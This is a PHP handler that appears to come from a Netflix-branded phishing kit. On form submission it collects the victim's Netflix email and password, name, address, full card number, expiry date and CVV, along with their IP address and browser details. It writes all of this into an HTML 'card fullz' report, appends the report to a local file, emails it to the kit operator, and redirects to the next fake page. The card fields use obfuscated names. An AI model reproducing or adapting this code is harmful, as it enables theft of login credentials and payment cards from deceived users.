<?php

session_start();

include('../__CONFIG__.php');
include './functions.php';

if (isset($_POST['next']))
{


	$_SESSION['sfirstName'] = $_POST['firstName'];
	$_SESSION['slastname']  = $_POST['lastname'];
	$_SESSION['saddress']   = $_POST['address'];
	$_SESSION['scity']      = $_POST['city'];
	$_SESSION['sstate']     = $_POST['state'];
	$_SESSION['szip']       = $_POST['zip'];
	$_SESSION['scnxxx']     = $_POST['cnxxx'];
	$_SESSION['seppp_MM']   = $_POST['eppp_MM'];
	$_SESSION['seppp_YY']   = $_POST['eppp_YY'];
	$_SESSION['sCXXVX']     = $_POST['CXXVX'];

	$subject  = "NETFLIX [ LOGIN - CARD FULLZ ] - ".$_SERVER['REMOTE_ADDR']."";
	$headers  = "From: SPYUS <rezlt@SPYUS.ORG>\r\n";
	$headers .= "MIME-Version: 1.0\r\n";
	$headers .= "Content-Type: text/html; charset=UTF-8\r\n";

	$message = "
	<!DOCTYPE html>
	<html>
	<head>
		<meta charset='UTF-8' />
	</head>
	<body>
	<style type='text/css'>
	body{
		background: #141414;
		color: #fff;
		font-family: arial;
	}
	.rezlt{
		width: 600px;
	}
	table{
		width: 100%;
	    background: #fff;
	    color: #000;
	}
	table td{
		padding: 10px;
	}
	.newline{
	    width: 100%;
	    background: #141414;
	    height: 2px;
	}
	</style>
	<center>
	<div class='rezlt'>
		<h3 style='text-align: center;background: #e50914;margin: 0px;padding: 17px;'>Netflix</h3>
		<table>
			<tr>
				<td style='width: 200px;'><b>Login Email</b></td>
				<td style='width: 400px;'>".$_SESSION['EM']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Login Password</b></td>
				<td style='width: 400px;'>".$_SESSION['PW']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>First Name</b></td>
				<td style='width: 400px;'>".$_POST['firstName']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Last Name</b></td>
				<td style='width: 400px;'>".$_POST['lastname']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Address</b></td>
				<td style='width: 400px;'>".$_POST['address']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>City</b></td>
				<td style='width: 400px;'>".$_POST['city']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>State</b></td>
				<td style='width: 400px;'>".$_POST['state']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Zip Code</b></td>
				<td style='width: 400px;'>".$_POST['zip']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Card Number</b></td>
				<td style='width: 400px;'>".$_POST['cnxxx']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Experation Date</b></td>
				<td style='width: 400px;'>".$_POST['eppp_MM']."/".$_POST['eppp_YY']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>CVV/CSC</b></td>
				<td style='width: 400px;'>".$_POST['CXXVX']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>First Name</b></td>
				<td style='width: 400px;'>".$_SESSION['firstname']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Last Name</b></td>
				<td style='width: 400px;'>".$_SESSION['lastname']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Phone</b></td>
				<td style='width: 400px;'>".$_SESSION['phone']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Credit Cards</b></td>
				<td style='width: 400px;'>".$_SESSION['ptype']." * * * ".$_SESSION['last4']." ".$_SESSION['exp_date']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>IP</b></td>
				<td style='width: 400px;'><a href='http://geoiptool.com/?ip=".$_SERVER['REMOTE_ADDR']."' target='_blank'>".$_SERVER['REMOTE_ADDR']."</a></td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>User Agent</b></td>
				<td style='width: 400px;'>".$_SERVER['HTTP_USER_AGENT']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Accept Language</b></td>
				<td style='width: 400px;'>".$_SERVER['HTTP_ACCEPT_LANGUAGE']."</td>
			</tr>
		</table>
	</div>
	</center>
	</body>
	</html>
	";
	$Txt_Rezlt = fopen('../../rezlt.html', 'a+');
	fwrite($Txt_Rezlt, $message);
	fclose($Txt_Rezlt);
	mail($to, $subject, $message, $headers);

	header('Location: ../ad_info.php?udm_cat_path='.sha1(time()));

}